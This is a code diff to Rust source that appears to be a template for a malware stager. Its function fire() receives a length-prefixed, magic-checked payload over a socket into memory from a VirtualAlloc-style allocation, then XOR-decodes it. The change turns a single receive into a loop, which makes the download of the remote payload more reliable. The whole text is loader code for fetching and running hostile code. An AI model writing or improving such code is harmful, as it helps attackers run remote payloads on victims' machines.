@@ -214,17 +214,29 @@ fn fire() {{
             return;
         }}
         let recv_magic = _convert_lebytes_to_u32(body_buf.as_ptr().add(1));
-        let recv_len = _convert_lebytes_to_u32(body_buf.as_ptr().add(5));
+        let mut recv_len = _convert_lebytes_to_u32(body_buf.as_ptr().add(5));
         if recv_magic.ne(&magic) || recv_len.eq(&0) {{
             return;
         }}
-        let ptr = _virtual_alloc(0 as _, recv_len as _, 0x1000, 0x4);
+        let ptr = _virtual_alloc(0 as _, recv_len as usize + 1, 0x1000, 0x4);
         if ptr.is_null() {{
             return;
         }}
-        let ret = recv_std(socket, ptr as _, recv_len as _);
-        if ret.eq(&0) {{
-            return;
+        let mut real_len:u32 = 0;
+        let mut left_len = recv_len + 1;
+        loop {{
+            let ret = recv_std(socket, ptr as usize + real_len as usize, left_len as _);
+            if ret.eq(&0) {{
+                return;
+            }}
+            real_len += ret as u32;
+            left_len -= ret as u32;
+            if recv_len.eq(&(real_len - 1)) {{
+                break;
+            }}
+            if real_len.gt(&recv_len) {{
+                return;
+            }}
         }}
         xor_process(
             ptr as _,
